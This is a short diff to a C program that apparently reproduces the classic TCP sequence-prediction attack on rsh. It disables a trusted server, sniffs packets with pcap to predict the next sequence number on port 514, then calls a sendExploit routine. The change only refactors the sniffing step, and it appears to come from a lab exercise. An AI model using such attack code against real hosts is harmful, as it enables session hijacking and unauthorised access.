@@ -7,7 +7,9 @@
 #include "sender.h"
 #include "packetsniffer.h"
 #include <pcap/pcap.h>
+
 void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
+
 int main()
 {
 
@@ -51,7 +53,8 @@ int main()
     fflush(stdout);
     disableServer(l,kevin,server);
     usleep(1000);
-    uint32_t next=packetSnifferInitialize(l,kevin,xterminal);
+    pcap_t *des=packetSnifferInitialize();
+    uint32_t next=getNextSeq(l,kevin,xterminal,514,514,des);
     printf("\n Next: %u",next);
     fflush(stdout);
     printf("\n EXPLOITING");
